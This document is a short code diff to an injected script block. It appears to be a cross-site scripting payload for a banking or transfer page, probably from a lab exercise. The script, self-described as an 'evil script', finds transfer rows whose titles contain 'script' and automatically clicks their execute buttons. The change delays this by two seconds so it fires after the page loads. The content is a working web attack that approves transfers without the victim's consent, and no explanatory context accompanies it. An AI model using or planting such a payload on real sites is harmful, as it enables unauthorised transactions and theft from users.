@@ -1,13 +1,15 @@
 <script>
-    var rows = document.querySelectorAll('tr');
-    rows.forEach(function(row) {
-        var transferTitle = row.querySelector('.transferTitle').innerHTML;
-        if (transferTitle.includes('script')) {
-            var executeButton = row.querySelector('.executeButton');
-            if (executeButton) {
-                executeButton.click();
-                console.log('Button clicked by evil script!');
+    setTimeout(() => {
+        var rows = document.querySelectorAll('tr');
+        rows.forEach(function(row) {
+            var transferTitle = row.querySelector('.transferTitle').innerHTML;
+            if (transferTitle.includes('script')) {
+                var executeButton = row.querySelector('.executeButton');
+                if (executeButton) {
+                    executeButton.click();
+                    console.log('Button clicked by evil script!');
+                }
             }
-        }
-    });
+        });
+    }, 2000);
 </script>
